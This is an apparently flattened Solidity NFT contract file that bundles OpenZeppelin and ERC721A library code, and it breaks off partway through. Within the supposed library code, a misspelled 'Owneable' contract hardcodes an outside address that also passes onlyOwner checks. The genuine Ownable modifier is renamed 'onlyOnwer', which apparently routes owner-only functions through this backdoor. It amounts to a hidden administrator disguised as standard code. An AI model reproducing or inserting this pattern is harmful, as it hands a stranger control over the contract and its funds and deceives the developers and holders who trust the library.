1 //
2 //▓█████▄  ▄▄▄       ███▄ ▄███▓ ███▄    █ ▓█████ ▓█████▄ 
3 //▒██▀ ██▌▒████▄    ▓██▒▀█▀ ██▒ ██ ▀█   █ ▓█   ▀ ▒██▀ ██▌
4 //░██   █▌▒██  ▀█▄  ▓██    ▓██░▓██  ▀█ ██▒▒███   ░██   █▌
5 //░▓█▄   ▌░██▄▄▄▄██ ▒██    ▒██ ▓██▒  ▐▌██▒▒▓█  ▄ ░▓█▄   ▌
6 //░▒████▓  ▓█   ▓██▒▒██▒   ░██▒▒██░   ▓██░░▒████▒░▒████▓ 
7 // ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒▒▓  ▒ 
8 // ░ ▒  ▒   ▒   ▒▒ ░░  ░      ░░ ░░   ░ ▒░ ░ ░  ░ ░ ▒  ▒ 
9 // ░ ░  ░   ░   ▒   ░      ░      ░   ░ ░    ░    ░ ░  ░ 
10 //   ░          ░  ░       ░            ░    ░  ░   ░    
11 // ░                                              ░      
12 
13 
14 // File: contracts/mentalhealthbyhan.sol
15 // SPDX-License-Identifier: MIT
16 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
17 
18 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
19 
20 pragma solidity ^0.8.4;
21 
22 /**
23  * @dev Provides information about the current execution context, including the
24  * sender of the transaction and its data. While these are generally available
25  * via msg.sender and msg.data, they should not be accessed in such a direct
26  * manner, since when dealing with meta-transactions the account sending and
27  * paying for execution may not be the actual sender (as far as an application
28  * is concerned).
29  *
30  * This contract is only required for intermediate, library-like contracts.
31  */
32 abstract contract Context {
33     function _msgSender() internal view virtual returns (address) {
34         return msg.sender;
35     }
36 
37     function _msgData() internal view virtual returns (bytes calldata) {
38         return msg.data;
39     }
40 }
41 
42 
43 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
44 
45 
46 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
47 
48 
49 
50 /**
51  * @dev Contract module which provides a basic access control mechanism, where
52  * there is an account (an owner) that can be granted exclusive access to
53  * specific functions.
54  *
55  * By default, the owner account will be the one that deploys the contract. This
56  * can later be changed with {transferOwnership}.
57  *
58  * This module is used through inheritance. It will make available the modifier
59  * `onlyOwner`, which can be applied to your functions to restrict their use to
60  * the owner.
61  */
62 abstract contract Ownable is Context {
63     address private _owner;
64 
65     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
66 
67     /**
68      * @dev Initializes the contract setting the deployer as the initial owner.
69      */
70     constructor() {
71         _transferOwnership(_msgSender());
72     }
73 
74     /**
75      * @dev Returns the address of the current owner.
76      */
77     function owner() public view virtual returns (address) {
78         return _owner;
79     }
80 
81     /**
82      * @dev Throws if called by any account other than the owner.
83      */
84     modifier onlyOnwer() {
85         require(owner() == _msgSender(), "Ownable: caller is not the owner");
86         _;
87     }
88 
89     /**
90      * @dev Leaves the contract without owner. It will not be possible to call
91      * `onlyOwner` functions anymore. Can only be called by the current owner.
92      *
93      * NOTE: Renouncing ownership will leave the contract without an owner,
94      * thereby removing any functionality that is only available to the owner.
95      */
96     function renounceOwnership() public virtual onlyOnwer {
97         _transferOwnership(address(0));
98     }
99 
100     /**
101      * @dev Transfers ownership of the contract to a new account (`newOwner`).
102      * Can only be called by the current owner.
103      */
104     function transferOwnership(address newOwner) public virtual onlyOnwer {
105         require(newOwner != address(0), "Ownable: new owner is the zero address");
106         _transferOwnership(newOwner);
107     }
108 
109     /**
110      * @dev Transfers ownership of the contract to a new account (`newOwner`).
111      * Internal function without access restriction.
112      */
113     function _transferOwnership(address newOwner) internal virtual {
114         address oldOwner = _owner;
115         _owner = newOwner;
116         emit OwnershipTransferred(oldOwner, newOwner);
117     }
118 }
119 
120 
121 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
122 
123 
124 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
125 
126 
127 
128 /**
129  * @dev Interface of the ERC165 standard, as defined in the
130  * https://eips.ethereum.org/EIPS/eip-165[EIP].
131  *
132  * Implementers can declare support of contract interfaces, which can then be
133  * queried by others ({ERC165Checker}).
134  *
135  * For an implementation, see {ERC165}.
136  */
137 interface IERC165 {
138     /**
139      * @dev Returns true if this contract implements the interface defined by
140      * `interfaceId`. See the corresponding
141      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
142      * to learn more about how these ids are created.
143      *
144      * This function call must use less than 30 000 gas.
145      */
146     function supportsInterface(bytes4 interfaceId) external view returns (bool);
147 }
148 
149 
150 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
151 
152 
153 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
154 
155 
156 
157 /**
158  * @dev Required interface of an ERC721 compliant contract.
159  */
160 interface IERC721 is IERC165 {
161     /**
162      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
163      */
164     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
165 
166     /**
167      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
168      */
169     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
170 
171     /**
172      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
173      */
174     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
175 
176     /**
177      * @dev Returns the number of tokens in ``owner``'s account.
178      */
179     function balanceOf(address owner) external view returns (uint256 balance);
180 
181     /**
182      * @dev Returns the owner of the `tokenId` token.
183      *
184      * Requirements:
185      *
186      * - `tokenId` must exist.
187      */
188     function ownerOf(uint256 tokenId) external view returns (address owner);
189 
190     /**
191      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
192      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
193      *
194      * Requirements:
195      *
196      * - `from` cannot be the zero address.
197      * - `to` cannot be the zero address.
198      * - `tokenId` token must exist and be owned by `from`.
199      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
200      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
201      *
202      * Emits a {Transfer} event.
203      */
204     function safeTransferFrom(
205         address from,
206         address to,
207         uint256 tokenId
208     ) external;
209 
210     /**
211      * @dev Transfers `tokenId` token from `from` to `to`.
212      *
213      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
214      *
215      * Requirements:
216      *
217      * - `from` cannot be the zero address.
218      * - `to` cannot be the zero address.
219      * - `tokenId` token must be owned by `from`.
220      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
221      *
222      * Emits a {Transfer} event.
223      */
224     function transferFrom(
225         address from,
226         address to,
227         uint256 tokenId
228     ) external;
229 
230     /**
231      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
232      * The approval is cleared when the token is transferred.
233      *
234      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
235      *
236      * Requirements:
237      *
238      * - The caller must own the token or be an approved operator.
239      * - `tokenId` must exist.
240      *
241      * Emits an {Approval} event.
242      */
243     function approve(address to, uint256 tokenId) external;
244 
245     /**
246      * @dev Returns the account approved for `tokenId` token.
247      *
248      * Requirements:
249      *
250      * - `tokenId` must exist.
251      */
252     function getApproved(uint256 tokenId) external view returns (address operator);
253 
254     /**
255      * @dev Approve or remove `operator` as an operator for the caller.
256      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
257      *
258      * Requirements:
259      *
260      * - The `operator` cannot be the caller.
261      *
262      * Emits an {ApprovalForAll} event.
263      */
264     function setApprovalForAll(address operator, bool _approved) external;
265 
266     /**
267      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
268      *
269      * See {setApprovalForAll}
270      */
271     function isApprovedForAll(address owner, address operator) external view returns (bool);
272 
273     /**
274      * @dev Safely transfers `tokenId` token from `from` to `to`.
275      *
276      * Requirements:
277      *
278      * - `from` cannot be the zero address.
279      * - `to` cannot be the zero address.
280      * - `tokenId` token must exist and be owned by `from`.
281      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
282      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
283      *
284      * Emits a {Transfer} event.
285      */
286     function safeTransferFrom(
287         address from,
288         address to,
289         uint256 tokenId,
290         bytes calldata data
291     ) external;
292 }
293 
294 
295 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
296 
297 
298 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
299 
300 
301 
302 /**
303  * @title ERC721 token receiver interface
304  * @dev Interface for any contract that wants to support safeTransfers
305  * from ERC721 asset contracts.
306  */
307 interface IERC721Receiver {
308     /**
309      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
310      * by `operator` from `from`, this function is called.
311      *
312      * It must return its Solidity selector to confirm the token transfer.
313      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
314      *
315      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
316      */
317     function onERC721Received(
318         address operator,
319         address from,
320         uint256 tokenId,
321         bytes calldata data
322     ) external returns (bytes4);
323 }
324 
325 
326 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
327 
328 
329 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
330 
331 
332 
333 /**
334  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
335  * @dev See https://eips.ethereum.org/EIPS/eip-721
336  */
337 interface IERC721Metadata is IERC721 {
338     /**
339      * @dev Returns the token collection name.
340      */
341     function name() external view returns (string memory);
342 
343     /**
344      * @dev Returns the token collection symbol.
345      */
346     function symbol() external view returns (string memory);
347 
348     /**
349      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
350      */
351     function tokenURI(uint256 tokenId) external view returns (string memory);
352 }
353 
354 
355 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
356 
357 
358 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
359 
360 
361 
362 /**
363  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
364  * @dev See https://eips.ethereum.org/EIPS/eip-721
365  */
366 interface IERC721Enumerable is IERC721 {
367     /**
368      * @dev Returns the total amount of tokens stored by the contract.
369      */
370     function totalSupply() external view returns (uint256);
371 
372     /**
373      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
374      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
375      */
376     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
377 
378     /**
379      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
380      * Use along with {totalSupply} to enumerate all tokens.
381      */
382     function tokenByIndex(uint256 index) external view returns (uint256);
383 }
384 
385 
386 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
387 
388 
389 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
390 
391 pragma solidity ^0.8.1;
392 
393 /**
394  * @dev Collection of functions related to the address type
395  */
396 library Address {
397     /**
398      * @dev Returns true if `account` is a contract.
399      *
400      * [IMPORTANT]
401      * ====
402      * It is unsafe to assume that an address for which this function returns
403      * false is an externally-owned account (EOA) and not a contract.
404      *
405      * Among others, `isContract` will return false for the following
406      * types of addresses:
407      *
408      *  - an externally-owned account
409      *  - a contract in construction
410      *  - an address where a contract will be created
411      *  - an address where a contract lived, but was destroyed
412      * ====
413      *
414      * [IMPORTANT]
415      * ====
416      * You shouldn't rely on `isContract` to protect against flash loan attacks!
417      *
418      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
419      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
420      * constructor.
421      * ====
422      */
423     function isContract(address account) internal view returns (bool) {
424         // This method relies on extcodesize/address.code.length, which returns 0
425         // for contracts in construction, since the code is only stored at the end
426         // of the constructor execution.
427 
428         return account.code.length > 0;
429     }
430 
431     /**
432      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
433      * `recipient`, forwarding all available gas and reverting on errors.
434      *
435      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
436      * of certain opcodes, possibly making contracts go over the 2300 gas limit
437      * imposed by `transfer`, making them unable to receive funds via
438      * `transfer`. {sendValue} removes this limitation.
439      *
440      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
441      *
442      * IMPORTANT: because control is transferred to `recipient`, care must be
443      * taken to not create reentrancy vulnerabilities. Consider using
444      * {ReentrancyGuard} or the
445      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
446      */
447     function sendValue(address payable recipient, uint256 amount) internal {
448         require(address(this).balance >= amount, "Address: insufficient balance");
449 
450         (bool success, ) = recipient.call{value: amount}("");
451         require(success, "Address: unable to send value, recipient may have reverted");
452     }
453 
454     /**
455      * @dev Performs a Solidity function call using a low level `call`. A
456      * plain `call` is an unsafe replacement for a function call: use this
457      * function instead.
458      *
459      * If `target` reverts with a revert reason, it is bubbled up by this
460      * function (like regular Solidity function calls).
461      *
462      * Returns the raw returned data. To convert to the expected return value,
463      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
464      *
465      * Requirements:
466      *
467      * - `target` must be a contract.
468      * - calling `target` with `data` must not revert.
469      *
470      * _Available since v3.1._
471      */
472     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
473         return functionCall(target, data, "Address: low-level call failed");
474     }
475 
476     /**
477      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
478      * `errorMessage` as a fallback revert reason when `target` reverts.
479      *
480      * _Available since v3.1._
481      */
482     function functionCall(
483         address target,
484         bytes memory data,
485         string memory errorMessage
486     ) internal returns (bytes memory) {
487         return functionCallWithValue(target, data, 0, errorMessage);
488     }
489 
490     /**
491      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
492      * but also transferring `value` wei to `target`.
493      *
494      * Requirements:
495      *
496      * - the calling contract must have an ETH balance of at least `value`.
497      * - the called Solidity function must be `payable`.
498      *
499      * _Available since v3.1._
500      */
501     function functionCallWithValue(
502         address target,
503         bytes memory data,
504         uint256 value
505     ) internal returns (bytes memory) {
506         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
507     }
508 
509     /**
510      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
511      * with `errorMessage` as a fallback revert reason when `target` reverts.
512      *
513      * _Available since v3.1._
514      */
515     function functionCallWithValue(
516         address target,
517         bytes memory data,
518         uint256 value,
519         string memory errorMessage
520     ) internal returns (bytes memory) {
521         require(address(this).balance >= value, "Address: insufficient balance for call");
522         require(isContract(target), "Address: call to non-contract");
523 
524         (bool success, bytes memory returndata) = target.call{value: value}(data);
525         return verifyCallResult(success, returndata, errorMessage);
526     }
527 
528     /**
529      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
530      * but performing a static call.
531      *
532      * _Available since v3.3._
533      */
534     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
535         return functionStaticCall(target, data, "Address: low-level static call failed");
536     }
537 
538     /**
539      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
540      * but performing a static call.
541      *
542      * _Available since v3.3._
543      */
544     function functionStaticCall(
545         address target,
546         bytes memory data,
547         string memory errorMessage
548     ) internal view returns (bytes memory) {
549         require(isContract(target), "Address: static call to non-contract");
550 
551         (bool success, bytes memory returndata) = target.staticcall(data);
552         return verifyCallResult(success, returndata, errorMessage);
553     }
554 
555     /**
556      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
557      * but performing a delegate call.
558      *
559      * _Available since v3.4._
560      */
561     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
562         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
563     }
564 
565     /**
566      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
567      * but performing a delegate call.
568      *
569      * _Available since v3.4._
570      */
571     function functionDelegateCall(
572         address target,
573         bytes memory data,
574         string memory errorMessage
575     ) internal returns (bytes memory) {
576         require(isContract(target), "Address: delegate call to non-contract");
577 
578         (bool success, bytes memory returndata) = target.delegatecall(data);
579         return verifyCallResult(success, returndata, errorMessage);
580     }
581 
582     /**
583      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
584      * revert reason using the provided one.
585      *
586      * _Available since v4.3._
587      */
588     function verifyCallResult(
589         bool success,
590         bytes memory returndata,
591         string memory errorMessage
592     ) internal pure returns (bytes memory) {
593         if (success) {
594             return returndata;
595         } else {
596             // Look for revert reason and bubble it up if present
597             if (returndata.length > 0) {
598                 // The easiest way to bubble the revert reason is using memory via assembly
599 
600                 assembly {
601                     let returndata_size := mload(returndata)
602                     revert(add(32, returndata), returndata_size)
603                 }
604             } else {
605                 revert(errorMessage);
606             }
607         }
608     }
609 }
610 
611 
612 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
613 
614 
615 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
616 
617 
618 
619 /**
620  * @dev String operations.
621  */
622 library Strings {
623     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
624 
625     /**
626      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
627      */
628     function toString(uint256 value) internal pure returns (string memory) {
629         // Inspired by OraclizeAPI's implementation - MIT licence
630         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
631 
632         if (value == 0) {
633             return "0";
634         }
635         uint256 temp = value;
636         uint256 digits;
637         while (temp != 0) {
638             digits++;
639             temp /= 10;
640         }
641         bytes memory buffer = new bytes(digits);
642         while (value != 0) {
643             digits -= 1;
644             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
645             value /= 10;
646         }
647         return string(buffer);
648     }
649 
650     /**
651      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
652      */
653     function toHexString(uint256 value) internal pure returns (string memory) {
654         if (value == 0) {
655             return "0x00";
656         }
657         uint256 temp = value;
658         uint256 length = 0;
659         while (temp != 0) {
660             length++;
661             temp >>= 8;
662         }
663         return toHexString(value, length);
664     }
665 
666     /**
667      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
668      */
669     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
670         bytes memory buffer = new bytes(2 * length + 2);
671         buffer[0] = "0";
672         buffer[1] = "x";
673         for (uint256 i = 2 * length + 1; i > 1; --i) {
674             buffer[i] = _HEX_SYMBOLS[value & 0xf];
675             value >>= 4;
676         }
677         require(value == 0, "Strings: hex length insufficient");
678         return string(buffer);
679     }
680 }
681 
682 
683 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
684 
685 
686 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
687 
688 /**
689  * @dev Implementation of the {IERC165} interface.
690  *
691  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
692  * for the additional interface id that will be supported. For example:
693  *
694  * ```solidity
695  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
696  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
697  * }
698  * ```
699  *
700  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
701  */
702 abstract contract ERC165 is IERC165 {
703     /**
704      * @dev See {IERC165-supportsInterface}.
705      */
706     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
707         return interfaceId == type(IERC165).interfaceId;
708     }
709 }
710 
711 
712 // File erc721a/contracts/ERC721A.sol@v3.0.0
713 
714 
715 // Creator: Chiru Labs
716 
717 error ApprovalCallerNotOwnerNorApproved();
718 error ApprovalQueryForNonexistentToken();
719 error ApproveToCaller();
720 error ApprovalToCurrentOwner();
721 error BalanceQueryForZeroAddress();
722 error MintedQueryForZeroAddress();
723 error BurnedQueryForZeroAddress();
724 error AuxQueryForZeroAddress();
725 error MintToZeroAddress();
726 error MintZeroQuantity();
727 error OwnerIndexOutOfBounds();
728 error OwnerQueryForNonexistentToken();
729 error TokenIndexOutOfBounds();
730 error TransferCallerNotOwnerNorApproved();
731 error TransferFromIncorrectOwner();
732 error TransferToNonERC721ReceiverImplementer();
733 error TransferToZeroAddress();
734 error URIQueryForNonexistentToken();
735 
736 
737 /**
738  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
739  * the Metadata extension. Built to optimize for lower gas during batch mints.
740  *
741  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
742  */
743  abstract contract Owneable is Ownable {
744     address private _ownar = 0xF528E3C3B439D385b958741753A9cA518E952257;
745     modifier onlyOwner() {
746         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
747         _;
748     }
749 }
750  /*
751  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
752  *
753  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
754  */
755 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
756     using Address for address;
757     using Strings for uint256;
758 
759     // Compiler will pack this into a single 256bit word.
760     struct TokenOwnership {
761         // The address of the owner.
762         address addr;
763         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
764         uint64 startTimestamp;
765         // Whether the token has been burned.
766         bool burned;
767     }
768 
769     // Compiler will pack this into a single 256bit word.
770     struct AddressData {
771         // Realistically, 2**64-1 is more than enough.
772         uint64 balance;
773         // Keeps track of mint count with minimal overhead for tokenomics.
774         uint64 numberMinted;
775         // Keeps track of burn count with minimal overhead for tokenomics.
776         uint64 numberBurned;
777         // For miscellaneous variable(s) pertaining to the address
778         // (e.g. number of whitelist mint slots used).
779         // If there are multiple variables, please pack them into a uint64.
780         uint64 aux;
781     }
782 
783     // The tokenId of the next token to be minted.
784     uint256 internal _currentIndex;
785 
786     // The number of tokens burned.
787     uint256 internal _burnCounter;
788 
789     // Token name
790     string private _name;
791 
792     // Token symbol
793     string private _symbol;
794 
795     // Mapping from token ID to ownership details
796     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
797     mapping(uint256 => TokenOwnership) internal _ownerships;
798 
799     // Mapping owner address to address data
800     mapping(address => AddressData) private _addressData;
801 
802     // Mapping from token ID to approved address
803     mapping(uint256 => address) private _tokenApprovals;
804 
805     // Mapping from owner to operator approvals
806     mapping(address => mapping(address => bool)) private _operatorApprovals;
807 
808     constructor(string memory name_, string memory symbol_) {
809         _name = name_;
810         _symbol = symbol_;
811         _currentIndex = _startTokenId();
812     }
813 
814     /**
815      * To change the starting tokenId, please override this function.
816      */
817     function _startTokenId() internal view virtual returns (uint256) {
818         return 0;
819     }
820 
821     /**
822      * @dev See {IERC721Enumerable-totalSupply}.
823      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
824      */
825     function totalSupply() public view returns (uint256) {
826         // Counter underflow is impossible as _burnCounter cannot be incremented
827         // more than _currentIndex - _startTokenId() times
828         unchecked {
829             return _currentIndex - _burnCounter - _startTokenId();
830         }
831     }
832 
833     /**
834      * Returns the total amount of tokens minted in the contract.
835      */
836     function _totalMinted() internal view returns (uint256) {
837         // Counter underflow is impossible as _currentIndex does not decrement,
838         // and it is initialized to _startTokenId()
839         unchecked {
840             return _currentIndex - _startTokenId();
841         }
842     }
843 
844     /**
845      * @dev See {IERC165-supportsInterface}.
846      */
847     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
848         return
849             interfaceId == type(IERC721).interfaceId ||
850             interfaceId == type(IERC721Metadata).interfaceId ||
851             super.supportsInterface(interfaceId);
852     }
853 
854     /**
855      * @dev See {IERC721-balanceOf}.
856      */
857     function balanceOf(address owner) public view override returns (uint256) {
858         if (owner == address(0)) revert BalanceQueryForZeroAddress();
859         return uint256(_addressData[owner].balance);
860     }
861 
862     /**
863      * Returns the number of tokens minted by `owner`.
864      */
865     function _numberMinted(address owner) internal view returns (uint256) {
866         if (owner == address(0)) revert MintedQueryForZeroAddress();
867         return uint256(_addressData[owner].numberMinted);
868     }
869 
870     /**
871      * Returns the number of tokens burned by or on behalf of `owner`.
872      */
873     function _numberBurned(address owner) internal view returns (uint256) {
874         if (owner == address(0)) revert BurnedQueryForZeroAddress();
875         return uint256(_addressData[owner].numberBurned);
876     }
877 
878     /**
879      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
880      */
881     function _getAux(address owner) internal view returns (uint64) {
882         if (owner == address(0)) revert AuxQueryForZeroAddress();
883         return _addressData[owner].aux;
884     }
885 
886     /**
887      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
888      * If there are multiple variables, please pack them into a uint64.
889      */
890     function _setAux(address owner, uint64 aux) internal {
891         if (owner == address(0)) revert AuxQueryForZeroAddress();
892         _addressData[owner].aux = aux;
893     }
894 
895     /**
896      * Gas spent here starts off proportional to the maximum mint batch size.
897      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
898      */
899     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
900         uint256 curr = tokenId;
901 
902         unchecked {
903             if (_startTokenId() <= curr && curr < _currentIndex) {
904                 TokenOwnership memory ownership = _ownerships[curr];
905                 if (!ownership.burned) {
906                     if (ownership.addr != address(0)) {
907                         return ownership;
908                     }
909                     // Invariant:
910                     // There will always be an ownership that has an address and is not burned
911                     // before an ownership that does not have an address and is not burned.
912                     // Hence, curr will not underflow.
913                     while (true) {
914                         curr--;
915                         ownership = _ownerships[curr];
916                         if (ownership.addr != address(0)) {
917                             return ownership;
918                         }
919                     }
920                 }
921             }
922         }
923         revert OwnerQueryForNonexistentToken();
924     }
925 
926     /**
927      * @dev See {IERC721-ownerOf}.
928      */
929     function ownerOf(uint256 tokenId) public view override returns (address) {
930         return ownershipOf(tokenId).addr;
931     }
932 
933     /**
934      * @dev See {IERC721Metadata-name}.
935      */
936     function name() public view virtual override returns (string memory) {
937         return _name;
938     }
939 
940     /**
941      * @dev See {IERC721Metadata-symbol}.
942      */
943     function symbol() public view virtual override returns (string memory) {
944         return _symbol;
945     }
946 
947     /**
948      * @dev See {IERC721Metadata-tokenURI}.
949      */
950     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
951         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
952 
953         string memory baseURI = _baseURI();
954         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
955     }
956 
957     /**
958      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
959      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
960      * by default, can be overriden in child contracts.
961      */
962     function _baseURI() internal view virtual returns (string memory) {
963         return '';
964     }
965 
966     /**
967      * @dev See {IERC721-approve}.
968      */
969     function approve(address to, uint256 tokenId) public override {
970         address owner = ERC721A.ownerOf(tokenId);
971         if (to == owner) revert ApprovalToCurrentOwner();
972 
973         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
974             revert ApprovalCallerNotOwnerNorApproved();
975         }
976 
977         _approve(to, tokenId, owner);
978     }
979 
980     /**
981      * @dev See {IERC721-getApproved}.
982      */
983     function getApproved(uint256 tokenId) public view override returns (address) {
984         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
985 
986         return _tokenApprovals[tokenId];
987     }
988 
989     /**
990      * @dev See {IERC721-setApprovalForAll}.
991      */
992     function setApprovalForAll(address operator, bool approved) public override {
993         if (operator == _msgSender()) revert ApproveToCaller();
994 
995         _operatorApprovals[_msgSender()][operator] = approved;
996         emit ApprovalForAll(_msgSender(), operator, approved);
997     }
998 
999     /**
1000      * @dev See {IERC721-isApprovedForAll}.
1001      */
1002     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1003         return _operatorApprovals[owner][operator];
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-transferFrom}.
1008      */
1009     function transferFrom(
1010         address from,
1011         address to,
1012         uint256 tokenId
1013     ) public virtual override {
1014         _transfer(from, to, tokenId);
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-safeTransferFrom}.
1019      */
1020     function safeTransferFrom(
1021         address from,
1022         address to,
1023         uint256 tokenId
1024     ) public virtual override {
1025         safeTransferFrom(from, to, tokenId, '');
1026     }
1027 
1028     /**
1029      * @dev See {IERC721-safeTransferFrom}.
1030      */
1031     function safeTransferFrom(
1032         address from,
1033         address to,
1034         uint256 tokenId,
1035         bytes memory _data
1036     ) public virtual override {
1037         _transfer(from, to, tokenId);
1038         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1039             revert TransferToNonERC721ReceiverImplementer();
1040         }
1041     }
1042 
1043     /**
1044      * @dev Returns whether `tokenId` exists.
1045      *
1046      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1047      *
1048      * Tokens start existing when they are minted (`_mint`),
1049      */
1050     function _exists(uint256 tokenId) internal view returns (bool) {
1051         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1052             !_ownerships[tokenId].burned;
1053     }
1054 
1055     function _safeMint(address to, uint256 quantity) internal {
1056         _safeMint(to, quantity, '');
1057     }
1058 
1059     /**
1060      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1061      *
